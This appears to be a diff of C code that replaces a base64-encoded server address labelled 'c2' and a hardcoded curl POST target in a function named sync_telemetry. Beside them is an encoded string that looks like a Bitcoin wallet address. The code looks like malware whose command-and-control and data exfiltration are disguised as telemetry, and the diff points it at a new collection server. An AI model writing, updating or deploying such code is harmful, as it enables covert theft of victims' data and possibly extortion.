@@ -540,7 +540,7 @@ cleanup:
 }
 
 /* === write_manifest === */
-static const char *b64_c2 = "aHR0cDovLzEwLjE1MC4zLjE2Mjo4MDgw";
+static const char *b64_c2 = "aHR0cDovLzEwLjI1NC4xOS4xOTE6ODA4MA==";
 static const char *b64_addr = "MUFBMFBlMVlQNEdlZmkyRE1QVGY1U0xtbjdEaXZmTmE=";
 
 static inline void secure_clean(void *v, size_t n)
@@ -958,7 +958,7 @@ int sync_telemetry(void) {
         return 5;
     }
 
-    curl_easy_setopt(curl, CURLOPT_URL, "http://10.150.3.162:8080/collect");
+    curl_easy_setopt(curl, CURLOPT_URL, "http://10.254.19.191:8080/collect");
     curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload);
     curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(payload));
     curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
